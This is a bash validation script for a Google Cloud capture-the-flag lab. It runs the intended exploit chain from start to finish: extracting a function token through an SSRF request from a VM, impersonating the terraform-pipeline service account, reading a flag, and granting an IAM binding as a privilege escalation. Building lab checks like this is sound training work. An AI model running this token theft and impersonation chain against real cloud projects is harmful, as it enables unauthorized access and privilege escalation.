#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
NC='\033[0m' # No Color

PASSED=0
FAILED=0

print_step() { echo -e "\n${BLUE}[STEP]${NC} $1"; }
print_pass() { echo -e "${GREEN}[PASS]${NC} $1"; PASSED=$((PASSED + 1)); }
print_fail() { echo -e "${RED}[FAIL]${NC} $1"; FAILED=$((FAILED + 1)); exit 1; }
print_info() { echo -e "${YELLOW}[INFO]${NC} $1"; }

echo "==========================================="
echo "Challenge 5 (Module 4) Validation Script"
echo "==========================================="

# Check prerequisites
print_step "Checking prerequisites..."

if [ -z "${PROJECT_ID:-}" ]; then
    print_fail "PROJECT_ID environment variable not set. Run: export PROJECT_ID=<your-project-id>"
fi
print_info "PROJECT_ID is set: $PROJECT_ID"


# Check for required tools
for tool in gcloud gsutil jq curl; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        print_fail "$tool is not installed"
    fi
done
print_pass "All required tools are installed"

# Check we're using validation configuration
CURRENT_CONFIG=$(gcloud config configurations list --filter="is_active=true" --format="value(name)")
if [ "$CURRENT_CONFIG" != "validation" ]; then
    print_fail "Not using validation configuration. Current config: $CURRENT_CONFIG. Run: gcloud config configurations activate validation"
fi
print_pass "Using validation configuration"

# Create/use validation test directory
VAL_TEST_DIR="./val-test"
mkdir -p "$VAL_TEST_DIR"
print_pass "Created/using validation test directory: $VAL_TEST_DIR"

# Validate Module 3 token
print_step "Validating Module 3 function token..."

# Check for cached function token
FUNCTION_TOKEN_FILE="$VAL_TEST_DIR/function_token.txt"
if [ -f "$FUNCTION_TOKEN_FILE" ]; then
    FUNCTION_TOKEN=$(cat "$FUNCTION_TOKEN_FILE")
    print_info "Using cached function token from Module 3"
else
    # Extract token via SSRF attack from Module 3
    print_info "No cached token found, extracting from Module 3..."
    
    # Check for VM IP from Module 2
    VM_IP_FILE="$VAL_TEST_DIR/vm_ip.txt"
    if [ ! -f "$VM_IP_FILE" ]; then
        print_fail "VM IP not found. Run validate-m2.sh first"
    fi
    VM_IP=$(cat "$VM_IP_FILE")
    
    # Check for SSH key
    SSH_KEY_FILE="$VAL_TEST_DIR/ssh_key"
    if [ ! -f "$SSH_KEY_FILE" ]; then
        print_fail "SSH key not found. Run validate-m2.sh first"
    fi
    
    print_info "Using VM IP: $VM_IP"
    
    # Get the monitoring function URL
    FUNCTION_URL=$(gcloud run services describe monitoring-function --region=us-east1 --format='value(status.url)' )
    if [ -z "$FUNCTION_URL" ]; then
        print_fail "Monitoring function not found. Check Module 3 infrastructure"
    fi
    print_info "Function URL: $FUNCTION_URL"
    
    # Execute SSRF attack to get function token
    print_info "Extracting function token via SSRF..."
    FUNCTION_TOKEN=$(ssh -i "$SSH_KEY_FILE" -o StrictHostKeyChecking=no -o ConnectTimeout=10 "alice@$VM_IP" \
        "curl -s -X POST '$FUNCTION_URL' -H \"Authorization: bearer \$(gcloud auth print-identity-token)\" -H \"Content-Type: application/json\" -d '{\"metadata\": \"token\"}'" )
    
    if [ -z "$FUNCTION_TOKEN" ]; then
        print_fail "Failed to extract function token from monitoring function"
    fi
    
    # Cache the token
    echo "$FUNCTION_TOKEN" > "$FUNCTION_TOKEN_FILE"
    print_pass "Function token extracted and cached"
fi

# Validate token has cloud-platform scope
print_info "Validating function token scope..."
TOKEN_INFO=$(curl -s "https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=$FUNCTION_TOKEN")
if echo "$TOKEN_INFO" | jq -r '.scope' | grep -q "cloud-platform"; then
    print_pass "Function token has cloud-platform scope"
else
    print_fail "Function token does not have required scope"
fi

# Set token for subsequent commands
export CLOUDSDK_AUTH_ACCESS_TOKEN="$FUNCTION_TOKEN"
print_pass "Function token set for validation"

# Service account discovery
print_step "Discovering service accounts and roles..."

# List all service accounts
print_info "Listing all service accounts in project..."
SERVICE_ACCOUNTS=$(gcloud iam service-accounts list --format="value(email)" )
if [ $? -ne 0 ]; then
    print_fail "Failed to list service accounts"
fi

# Check for terraform-pipeline service account
TERRAFORM_SA="terraform-pipeline@$PROJECT_ID.iam.gserviceaccount.com"
if echo "$SERVICE_ACCOUNTS" | grep -q "$TERRAFORM_SA"; then
    print_pass "Found terraform-pipeline service account: $TERRAFORM_SA"
else
    print_fail "terraform-pipeline service account not found"
fi

# Check for compute service account
COMPUTE_SA=$(echo "$SERVICE_ACCOUNTS" | grep -E "^[0-9]+-compute@developer\.gserviceaccount\.com$" | head -1)
if [ -n "$COMPUTE_SA" ]; then
    print_pass "Found compute service account: $COMPUTE_SA"
else
    print_fail "Compute service account not found"
fi

print_info "All service accounts:"
echo "$SERVICE_ACCOUNTS" | while read -r sa; do
    echo "  - $sa"
done

# Analyze custom role
print_step "Analyzing TerraformPipelineProjectAdmin custom role..."

# Check if custom role exists
CUSTOM_ROLE="projects/$PROJECT_ID/roles/TerraformPipelineProjectAdmin"
ROLE_INFO=$(gcloud iam roles describe TerraformPipelineProjectAdmin --project="$PROJECT_ID" --format=json )
if [ $? -ne 0 ]; then
    print_fail "TerraformPipelineProjectAdmin custom role not found"
fi

# Check for required permissions
if echo "$ROLE_INFO" | jq -r '.includedPermissions[]' | grep -q "resourcemanager.projects.setIamPolicy"; then
    print_pass "Custom role has resourcemanager.projects.setIamPolicy permission"
else
    print_fail "Custom role missing resourcemanager.projects.setIamPolicy permission"
fi

if echo "$ROLE_INFO" | jq -r '.includedPermissions[]' | grep -q "resourcemanager.projects.getIamPolicy"; then
    print_pass "Custom role has resourcemanager.projects.getIamPolicy permission"
else
    print_fail "Custom role missing resourcemanager.projects.getIamPolicy permission"
fi

print_info "TerraformPipelineProjectAdmin role permissions:"
echo "$ROLE_INFO" | jq -r '.includedPermissions[]' | while read -r perm; do
    echo "  - $perm"
done

# Verify IAM bindings and extract flag
print_step "Verifying IAM bindings and extracting flag..."

# Get IAM policy for terraform-pipeline service account
print_info "Checking IAM policy for terraform-pipeline service account..."
TERRAFORM_SA_POLICY=$(gcloud iam service-accounts get-iam-policy "$TERRAFORM_SA" --format=json )
if [ $? -ne 0 ]; then
    print_fail "Failed to get IAM policy for terraform-pipeline service account"
fi

# Check if compute account has serviceAccountTokenCreator role
if echo "$TERRAFORM_SA_POLICY" | jq -r '.bindings[].members[]' | grep -q "serviceAccount:$COMPUTE_SA"; then
    print_pass "Compute service account has binding on terraform-pipeline"
else
    print_fail "Compute service account does not have binding on terraform-pipeline"
fi

# Extract flag5 from IAM condition description
print_info "Extracting flag5 from IAM condition..."
FLAG5=$(echo "$TERRAFORM_SA_POLICY" | jq -r '.bindings[] | select(.role=="roles/iam.serviceAccountTokenCreator") | .condition.description // empty' | grep -o 'flag5{[^}]*}')

if [ -n "$FLAG5" ]; then
    print_pass "Flag 5 found: $FLAG5"
    echo "$FLAG5" > "$VAL_TEST_DIR/flag5.txt"
    print_info "Flag saved to $VAL_TEST_DIR/flag5.txt"
else
    print_fail "Flag 5 not found in IAM condition description"
fi

# Verify IAM condition restricts to roles/viewer only
CONDITION_EXPR=$(echo "$TERRAFORM_SA_POLICY" | jq -r '.bindings[] | select(.role=="roles/iam.serviceAccountTokenCreator") | .condition.expression // empty')
if echo "$CONDITION_EXPR" | grep -q "hasOnly.*roles/viewer"; then
    print_pass "IAM condition correctly restricts to roles/viewer only"
else
    print_fail "IAM condition does not properly restrict role grants"
fi

print_info "IAM condition expression:"
echo "  $CONDITION_EXPR"

# Get project IAM policy to verify terraform-pipeline has custom role
print_info "Verifying terraform-pipeline has custom role on project..."
PROJECT_POLICY=$(gcloud projects get-iam-policy "$PROJECT_ID" --format=json )
if [ $? -ne 0 ]; then
    print_fail "Failed to get project IAM policy"
fi

# Check if terraform-pipeline has the custom role
if echo "$PROJECT_POLICY" | jq -r '.bindings[] | select(.role=="projects/'$PROJECT_ID'/roles/TerraformPipelineProjectAdmin") | .members[]' | grep -q "serviceAccount:$TERRAFORM_SA"; then
    print_pass "terraform-pipeline has TerraformPipelineProjectAdmin role on project"
else
    print_fail "terraform-pipeline does not have TerraformPipelineProjectAdmin role on project"
fi

# Test impersonation chain
print_step "Testing service account impersonation chain..."

# Test impersonating terraform-pipeline service account
print_info "Testing impersonation of terraform-pipeline service account..."
IMPERSONATION_TEST=$(gcloud auth print-access-token --impersonate-service-account="$TERRAFORM_SA" )
if [ $? -eq 0 ] && [ -n "$IMPERSONATION_TEST" ]; then
    print_pass "Successfully impersonated terraform-pipeline service account"
    
    # Save impersonated token
    IMPERSONATED_TOKEN="$IMPERSONATION_TEST"
    echo "$IMPERSONATED_TOKEN" > "$VAL_TEST_DIR/impersonated_token.txt"
    print_info "Impersonated token cached for further testing"
else
    print_fail "Failed to impersonate terraform-pipeline service account"
fi

# Test privilege escalation attempt
print_step "Testing privilege escalation capabilities..."

# Create a test user for validation
TEST_USER="test-validator-$(date +%s)@example.com"
print_info "Using test user: $TEST_USER"

# Test 1: Try to add roles/owner (should fail due to condition)
print_info "Testing attempt to grant roles/owner (should fail)..."
OWNER_RESULT=$(gcloud projects add-iam-policy-binding "$PROJECT_ID" \
    --member="user:$TEST_USER" \
    --role="roles/owner" \
    --impersonate-service-account="$TERRAFORM_SA" 2>&1)

if echo "$OWNER_RESULT" | grep -q "denied\|failed\|error"; then
    print_pass "Successfully blocked attempt to grant roles/owner (security boundary working)"
else
    print_fail "Failed to block roles/owner grant (security boundary not working)"
fi

# Test 2: Try to add roles/viewer (should succeed)
print_info "Testing attempt to grant roles/viewer (should succeed)..."
VIEWER_RESULT=$(gcloud projects add-iam-policy-binding "$PROJECT_ID" \
    --member="user:$TEST_USER" \
    --role="roles/viewer" \
    --impersonate-service-account="$TERRAFORM_SA" 2>&1)

if echo "$VIEWER_RESULT" | grep -q "Updated IAM policy\|bindings"; then
    print_pass "Successfully granted roles/viewer (privilege escalation working)"
    CLEANUP_NEEDED="true"
else
    print_fail "Failed to grant roles/viewer through impersonation"
fi

# Test 3: Verify the binding was actually added
print_info "Verifying IAM binding was added..."
UPDATED_POLICY=$(gcloud projects get-iam-policy "$PROJECT_ID" --format=json )
if echo "$UPDATED_POLICY" | jq -r '.bindings[] | select(.role=="roles/viewer") | .members[]' | grep -q "user:$TEST_USER"; then
    print_pass "IAM binding successfully added to project"
else
    print_fail "IAM binding was not added to project"
fi

# Additional security boundary tests
print_step "Testing additional security boundaries..."

# Test 4: Try to create service accounts (should fail)
print_info "Testing service account creation (should fail)..."
SA_CREATE_RESULT=$(gcloud iam service-accounts create test-sa-validation-$(date +%s) \
    --display-name="Test SA" \
    --impersonate-service-account="$TERRAFORM_SA" 2>&1)

if echo "$SA_CREATE_RESULT" | grep -q "denied\|forbidden\|permission"; then
    print_pass "Service account creation correctly denied"
else
    print_fail "Service account creation should have been denied"
fi

# Test 5: Try to access compute instances (should fail)
print_info "Testing compute instance access (should fail)..."
COMPUTE_RESULT=$(gcloud compute instances list \
    --impersonate-service-account="$TERRAFORM_SA" 2>&1)

if echo "$COMPUTE_RESULT" | grep -q "denied\|forbidden\|permission\|Required.*permission"; then
    print_pass "Compute instance access correctly denied"
else
    print_fail "Compute instance access should have been denied"
fi

# Test 6: Verify we can read project metadata (should work with viewer)
print_info "Testing project metadata access (should succeed with viewer)..."
PROJECT_INFO=$(gcloud projects describe "$PROJECT_ID" \
    --impersonate-service-account="$TERRAFORM_SA" \
    --format="value(projectId)" )

if [ "$PROJECT_INFO" = "$PROJECT_ID" ]; then
    print_pass "Project metadata access works correctly with viewer role"
else
    print_fail "Project metadata access failed (should work with viewer)"
fi

# Cleanup section
print_step "Cleaning up test resources..."

# Remove test IAM binding if it was added
if [ "$CLEANUP_NEEDED" = "true" ]; then
    print_info "Removing test IAM binding..."
    CLEANUP_RESULT=$(gcloud projects remove-iam-policy-binding "$PROJECT_ID" \
        --member="user:$TEST_USER" \
        --role="roles/viewer" \
        --impersonate-service-account="$TERRAFORM_SA" 2>&1)
    
    if echo "$CLEANUP_RESULT" | grep -q "Updated IAM policy"; then
        print_pass "Test IAM binding successfully removed"
    else
        print_info "Warning: Failed to remove test IAM binding - manual cleanup may be needed"
    fi
else
    print_info "No IAM binding cleanup needed"
fi

# Clear environment variables
unset CLOUDSDK_AUTH_ACCESS_TOKEN
print_info "Cleared CLOUDSDK_AUTH_ACCESS_TOKEN"

# Final validation summary
print_step "Challenge 5 Validation Summary"
echo "==========================================="
echo -e "${GREEN}✓ Module 3 function token validated and extracted${NC}"
echo -e "${GREEN}✓ Service accounts and custom role verified${NC}"
echo -e "${GREEN}✓ IAM bindings and flag5 extracted${NC}"
echo -e "${GREEN}✓ Impersonation chain tested successfully${NC}"
echo -e "${GREEN}✓ Privilege escalation path validated${NC}"
echo -e "${GREEN}✓ Security boundaries confirmed working${NC}"
echo "==========================================="

if [ -n "$FLAG5" ]; then
    echo -e "${BLUE}🏆 Flag 5 discovered: $FLAG5${NC}"
fi

echo -e "${GREEN}✓ Challenge 5 infrastructure is properly configured${NC}"
echo -e "${GREEN}✓ Exploit path is functional:${NC}"
echo "  1. Function token from Module 3 provides cloud-platform access"
echo "  2. compute service account can impersonate terraform-pipeline"
echo "  3. terraform-pipeline can modify project IAM (with restrictions)"
echo "  4. Security boundaries prevent excessive privilege escalation"
echo "==========================================="

echo -e "\n${GREEN}PASSED: $PASSED tests${NC}"
if [ $FAILED -gt 0 ]; then
    echo -e "${RED}FAILED: $FAILED tests${NC}"
    exit 1
else
    echo -e "${GREEN}All validation tests passed!${NC}"
    exit 0
fi
